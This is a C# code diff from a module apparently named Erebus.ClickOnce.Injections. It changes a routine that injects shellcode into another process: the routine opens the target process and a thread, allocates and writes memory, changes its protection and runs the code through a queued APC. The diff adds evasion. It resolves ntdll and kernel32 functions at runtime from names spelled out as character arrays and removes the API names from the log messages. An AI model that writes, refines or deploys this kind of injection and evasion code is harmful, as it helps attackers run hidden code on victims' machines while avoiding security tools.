@@ -64,7 +64,7 @@ namespace Erebus.ClickOnce.Injections
                 else
                 {
                     DebugLogger.WriteLine($"[*] Opening target process PID: {targetPid}");
-                    hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, targetPid);
+                    hProcess = DoOpenProcK(PROCESS_ALL_ACCESS, false, targetPid);
 
                     if (hProcess == IntPtr.Zero)
                     {
@@ -81,7 +81,7 @@ namespace Erebus.ClickOnce.Injections
                     }
 
                     threadId = (uint)proc.Threads[0].Id;
-                    hThread = OpenThread(THREAD_ALL_ACCESS, false, threadId);
+                    hThread = DoOpenThread(THREAD_ALL_ACCESS, false, threadId);
 
                     if (hThread == IntPtr.Zero)
                     {
@@ -97,7 +97,7 @@ namespace Erebus.ClickOnce.Injections
                 IntPtr baseAddress = IntPtr.Zero;
                 IntPtr regionSize = new IntPtr(shellcode.Length);
 
-                uint status = NtAllocateVirtualMemory(
+                uint status = DoAlloc(
                     hProcess,
                     ref baseAddress,
                     IntPtr.Zero,
@@ -107,7 +107,7 @@ namespace Erebus.ClickOnce.Injections
 
                 if (status != 0)
                 {
-                    DebugLogger.WriteLine($"[-] NtAllocateVirtualMemory failed with NTSTATUS: 0x{status:X}");
+                    DebugLogger.WriteLine($"[-] alloc step failed with NTSTATUS: 0x{status:X}");
                     return false;
                 }
 
@@ -115,7 +115,7 @@ namespace Erebus.ClickOnce.Injections
 
                 // Write shellcode to target process
                 uint written;
-                status = NtWriteVirtualMemory(
+                status = DoWrite(
                     hProcess,
                     baseAddress,
                     shellcode,
@@ -124,7 +124,7 @@ namespace Erebus.ClickOnce.Injections
 
                 if (status != 0)
                 {
-                    DebugLogger.WriteLine($"[-] NtWriteVirtualMemory failed with NTSTATUS: 0x{status:X}");
+                    DebugLogger.WriteLine($"[-] write step failed with NTSTATUS: 0x{status:X}");
                     return false;
                 }
 
@@ -135,7 +135,7 @@ namespace Erebus.ClickOnce.Injections
                 IntPtr protectSize = new IntPtr(shellcode.Length);
                 uint oldProtect;
 
-                status = NtProtectVirtualMemory(
+                status = DoProtect(
                     hProcess,
                     ref protectAddress,
                     ref protectSize,
@@ -144,7 +144,7 @@ namespace Erebus.ClickOnce.Injections
 
                 if (status != 0)
                 {
-                    DebugLogger.WriteLine($"[-] NtProtectVirtualMemory failed with NTSTATUS: 0x{status:X}");
+                    DebugLogger.WriteLine($"[-] protect step failed with NTSTATUS: 0x{status:X}");
                     return false;
                 }
 
@@ -155,7 +155,7 @@ namespace Erebus.ClickOnce.Injections
                 IntPtr tpWorkAddress = IntPtr.Zero;
                 IntPtr tpWorkSize = new IntPtr(0x200);
 
-                status = NtAllocateVirtualMemory(
+                status = DoAlloc(
                     hProcess,
                     ref tpWorkAddress,
                     IntPtr.Zero,
@@ -173,7 +173,7 @@ namespace Erebus.ClickOnce.Injections
                     byte[] addressBytes = BitConverter.GetBytes(baseAddress.ToInt64());
                     Array.Copy(addressBytes, 0, fakeTPWork, 0x30, addressBytes.Length);
 
-                    status = NtWriteVirtualMemory(
+                    status = DoWrite(
                         hProcess,
                         tpWorkAddress,
                         fakeTPWork,
@@ -187,7 +187,7 @@ namespace Erebus.ClickOnce.Injections
                 }
 
                 // Queue APC to execute shellcode This is the actual execution method (APC-based hybrid)
-                status = NtQueueApcThread(
+                status = DoQueueApc(
                     hThread,
                     baseAddress,
                     IntPtr.Zero,
@@ -196,7 +196,7 @@ namespace Erebus.ClickOnce.Injections
 
                 if (status != 0)
                 {
-                    DebugLogger.WriteLine($"[-] NtQueueApcThread failed with NTSTATUS: 0x{status:X}");
+                    DebugLogger.WriteLine($"[-] apc-queue step failed with NTSTATUS: 0x{status:X}");
                     return false;
                 }
 
@@ -204,11 +204,11 @@ namespace Erebus.ClickOnce.Injections
 
                 // Resume the thread to execute the APC
                 uint suspendCount;
-                status = NtResumeThread(hThread, out suspendCount);
+                status = DoResume(hThread, out suspendCount);
 
                 if (status != 0)
                 {
-                    DebugLogger.WriteLine($"[-] NtResumeThread failed with NTSTATUS: 0x{status:X}");
+                    DebugLogger.WriteLine($"[-] resume step failed with NTSTATUS: 0x{status:X}");
                     return false;
                 }
 
@@ -231,17 +231,17 @@ namespace Erebus.ClickOnce.Injections
                 // Cleanup handles
                 if (hThread != IntPtr.Zero)
                 {
-                    NtClose(hThread);
+                    DoClose(hThread);
                 }
                 if (hProcess != IntPtr.Zero)
                 {
-                    NtClose(hProcess);
+                    DoClose(hProcess);
                 }
             }
         }
 
-        [DllImport("ntdll.dll", SetLastError = true)]
-        private static extern uint NtAllocateVirtualMemory(
+        [UnmanagedFunctionPointer(CallingConvention.Winapi, SetLastError = true)]
+        private delegate uint FnAvm(
             IntPtr ProcessHandle,
             ref IntPtr BaseAddress,
             IntPtr ZeroBits,
@@ -249,50 +249,102 @@ namespace Erebus.ClickOnce.Injections
             uint AllocationType,
             uint Protect);
 
-        [DllImport("ntdll.dll", SetLastError = true)]
-        private static extern uint NtClose(IntPtr Handle);
+        [UnmanagedFunctionPointer(CallingConvention.Winapi, SetLastError = true)]
+        private delegate uint FnCl(IntPtr Handle);
 
-        [DllImport("ntdll.dll", SetLastError = true)]
-        private static extern uint NtOpenProcess(
+        [UnmanagedFunctionPointer(CallingConvention.Winapi, SetLastError = true)]
+        private delegate uint FnNop(
             out IntPtr ProcessHandle,
             uint DesiredAccess,
             ref OBJECT_ATTRIBUTES ObjectAttributes,
             ref CLIENT_ID ClientId);
 
-        [DllImport("ntdll.dll", SetLastError = true)]
-        private static extern uint NtProtectVirtualMemory(
+        [UnmanagedFunctionPointer(CallingConvention.Winapi, SetLastError = true)]
+        private delegate uint FnPvm(
             IntPtr ProcessHandle,
             ref IntPtr BaseAddress,
             ref IntPtr RegionSize,
             uint NewProtect,
             out uint OldProtect);
 
-        [DllImport("ntdll.dll", SetLastError = true)]
-        private static extern uint NtQueueApcThread(
+        [UnmanagedFunctionPointer(CallingConvention.Winapi, SetLastError = true)]
+        private delegate uint FnQat(
             IntPtr ThreadHandle,
             IntPtr ApcRoutine,
             IntPtr ApcArgument1,
             IntPtr ApcArgument2,
             IntPtr ApcArgument3);
 
-        [DllImport("ntdll.dll", SetLastError = true)]
-        private static extern uint NtResumeThread(
+        [UnmanagedFunctionPointer(CallingConvention.Winapi, SetLastError = true)]
+        private delegate uint FnRt(
             IntPtr ThreadHandle,
             out uint SuspendCount);
 
-        [DllImport("ntdll.dll", SetLastError = true)]
-        private static extern uint NtWriteVirtualMemory(
+        [UnmanagedFunctionPointer(CallingConvention.Winapi, SetLastError = true)]
+        private delegate uint FnWvm(
             IntPtr ProcessHandle,
             IntPtr BaseAddress,
             byte[] Buffer,
             uint BufferLength,
             out uint NumberOfBytesWritten);
 
-        [DllImport("kernel32.dll", SetLastError = true)]
-        private static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
+        [UnmanagedFunctionPointer(CallingConvention.Winapi, SetLastError = true)]
+        private delegate IntPtr FnOp(uint processAccess, bool bInheritHandle, int processId);
 
-        [DllImport("kernel32.dll", SetLastError = true)]
-        private static extern IntPtr OpenThread(uint dwDesiredAccess, bool bInheritHandle, uint dwThreadId);
+        [UnmanagedFunctionPointer(CallingConvention.Winapi, SetLastError = true)]
+        private delegate IntPtr FnOt(uint dwDesiredAccess, bool bInheritHandle, uint dwThreadId);
+
+        private static readonly Lazy<FnAvm> _ntAlloc =
+            Evasion.DynamicApi.LazyDelegate<FnAvm>(
+                Evasion.DynamicApi.Ntdll,
+                new[] { 'N', 't', 'A', 'l', 'l', 'o', 'c', 'a', 't', 'e', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y' });
+        private static readonly Lazy<FnCl> _ntClose =
+            Evasion.DynamicApi.LazyDelegate<FnCl>(
+                Evasion.DynamicApi.Ntdll,
+                new[] { 'N', 't', 'C', 'l', 'o', 's', 'e' });
+        private static readonly Lazy<FnNop> _ntOpenProc =
+            Evasion.DynamicApi.LazyDelegate<FnNop>(
+                Evasion.DynamicApi.Ntdll,
+                new[] { 'N', 't', 'O', 'p', 'e', 'n', 'P', 'r', 'o', 'c', 'e', 's', 's' });
+        private static readonly Lazy<FnPvm> _ntProtect =
+            Evasion.DynamicApi.LazyDelegate<FnPvm>(
+                Evasion.DynamicApi.Ntdll,
+                new[] { 'N', 't', 'P', 'r', 'o', 't', 'e', 'c', 't', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y' });
+        private static readonly Lazy<FnQat> _ntQueueApc =
+            Evasion.DynamicApi.LazyDelegate<FnQat>(
+                Evasion.DynamicApi.Ntdll,
+                new[] { 'N', 't', 'Q', 'u', 'e', 'u', 'e', 'A', 'p', 'c', 'T', 'h', 'r', 'e', 'a', 'd' });
+        private static readonly Lazy<FnRt> _ntResume =
+            Evasion.DynamicApi.LazyDelegate<FnRt>(
+                Evasion.DynamicApi.Ntdll,
+                new[] { 'N', 't', 'R', 'e', 's', 'u', 'm', 'e', 'T', 'h', 'r', 'e', 'a', 'd' });
+        private static readonly Lazy<FnWvm> _ntWrite =
+            Evasion.DynamicApi.LazyDelegate<FnWvm>(
+                Evasion.DynamicApi.Ntdll,
+                new[] { 'N', 't', 'W', 'r', 'i', 't', 'e', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y' });
+        private static readonly Lazy<FnOp> _openProc =
+            Evasion.DynamicApi.LazyDelegate<FnOp>(
+                Evasion.DynamicApi.Kernel32,
+                new[] { 'O', 'p', 'e', 'n', 'P', 'r', 'o', 'c', 'e', 's', 's' });
+        private static readonly Lazy<FnOt> _openThread =
+            Evasion.DynamicApi.LazyDelegate<FnOt>(
+                Evasion.DynamicApi.Kernel32,
+                new[] { 'O', 'p', 'e', 'n', 'T', 'h', 'r', 'e', 'a', 'd' });
+
+        private static uint DoAlloc(IntPtr p, ref IntPtr b, IntPtr z, ref IntPtr r, uint a, uint pr)
+            => _ntAlloc.Value(p, ref b, z, ref r, a, pr);
+        private static uint DoClose(IntPtr h) => _ntClose.Value(h);
+        private static uint DoOpenProc(out IntPtr ph, uint da, ref OBJECT_ATTRIBUTES oa, ref CLIENT_ID ci)
+            => _ntOpenProc.Value(out ph, da, ref oa, ref ci);
+        private static uint DoProtect(IntPtr p, ref IntPtr b, ref IntPtr r, uint n, out uint o)
+            => _ntProtect.Value(p, ref b, ref r, n, out o);
+        private static uint DoQueueApc(IntPtr t, IntPtr r, IntPtr a1, IntPtr a2, IntPtr a3)
+            => _ntQueueApc.Value(t, r, a1, a2, a3);
+        private static uint DoResume(IntPtr t, out uint s) => _ntResume.Value(t, out s);
+        private static uint DoWrite(IntPtr p, IntPtr b, byte[] buf, uint len, out uint wrote)
+            => _ntWrite.Value(p, b, buf, len, out wrote);
+        private static IntPtr DoOpenProcK(uint a, bool b, int c) => _openProc.Value(a, b, c);
+        private static IntPtr DoOpenThread(uint a, bool b, uint c) => _openThread.Value(a, b, c);
 
         [StructLayout(LayoutKind.Sequential)]
         private struct CLIENT_ID
